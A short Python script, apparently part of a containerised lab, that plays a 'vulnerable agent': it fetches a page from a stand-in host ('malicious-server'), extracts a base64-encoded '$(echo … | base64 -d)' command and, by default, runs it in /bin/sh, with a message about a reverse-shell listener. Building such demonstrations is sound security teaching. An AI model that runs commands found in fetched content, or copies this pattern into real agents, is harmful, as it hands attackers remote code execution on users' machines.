import os, re, base64, subprocess, time, sys
import urllib.request

TARGET_URL = os.getenv("TARGET_URL", "http://malicious-server:8000")
EXECUTE = os.getenv("EXECUTE_PAYLOAD", "true").lower() == "true"

pattern = re.compile(r"\$\(\s*echo\s+([A-Za-z0-9+/=]+)\s*\|\s*base64\s*-d\s*\)")

def http_get(url: str) -> str:
    with urllib.request.urlopen(url, timeout=5) as resp:
        return resp.read().decode("utf-8", errors="replace")

def main():
    print(f"[agent] Target: {TARGET_URL}")
    # small delay to let other containers boot
    time.sleep(2)

    try:
        print("[agent] Fetching content…")
        body = http_get(TARGET_URL)
        print("[agent] Received content:")
        print("-" * 60)
        print(body.strip())
        print("-" * 60)

        m = pattern.search(body)
        if not m:
            print("[agent] No payload pattern found.")
            sys.exit(0)

        b64 = m.group(1)
        decoded = base64.b64decode(b64).decode("utf-8", errors="replace").strip()
        print(f"[agent] Extracted payload (decoded): {decoded!r}")

        if EXECUTE:
            print("[agent] Executing payload (simulating vulnerable agent)…")
            # Execute in /bin/sh to mirror typical agent behavior
            subprocess.Popen(decoded, shell=True, executable="/bin/sh")
            print("[agent] Payload launched. If this is a reverse shell, check the listener.")
        else:
            print("[agent] EXECUTE_PAYLOAD=false — not executing payload.")
        # Keep process alive for a while to make demo/attach easier
        time.sleep(3600)

    except Exception as e:
        print(f"[agent] Error: {e}")
        time.sleep(10)
        sys.exit(1)

if __name__ == "__main__":
    main()
